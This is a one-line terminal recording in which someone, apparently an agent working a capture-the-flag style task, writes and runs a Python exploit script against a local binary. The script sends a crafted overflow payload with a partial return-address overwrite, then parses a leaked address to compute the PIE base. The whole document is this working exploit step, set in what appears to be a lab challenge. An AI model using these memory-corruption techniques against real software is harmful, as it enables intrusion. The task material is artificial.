[205.942379, "i", "cat << 'EOF' > /app/test.py\nimport subprocess\n\np = subprocess.Popen(['/app/gargantuan.bin'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)\n\ndef make_chunk(pad_char):\n    return bytes([pad_char]) * 256 + b'\\x00' + bytes([pad_char]) * 255\n\nc0 = make_chunk(0x41)\nc1 = make_chunk(0x42)\nc2 = make_chunk(0x43)\nc3 = make_chunk(0x44)\nc4 = bytes([0x45]) * 256 + b'\\x00' + bytes([0x46]) * 39 + b'\\xd9'\n\npayload = c0 + c1 + c2 + c3 + c4\n\np.stdin.write(payload)\np.stdin.flush()\n\n# Skip initial welcome\np.stdout.readline()\np.stdout.readline()\n\nout = b''\nwhile b'OO LATE! ' not in out:\n    out += p.stdout.read(1)\n\nleak_str = b''\nwhile True:\n    c = p.stdout.read(1)\n    if c == b'\\n': break\n    leak_str += c\n\nleak = int(leak_str.decode(), 16)\npie_base = leak - 0x11e5\nprint(f\"PIE Base: {hex(pie_base)}\")\n\n# Check if we returned to main\ntry:\n    msg = p.stdout.readline().decode().strip()\n    print(f\"Next message: {msg}\")\nexcept Exception as e:\n    print(f\"Failed to read next message: {e}\")\n\nEOF\npython3 /app/test.py\n"]
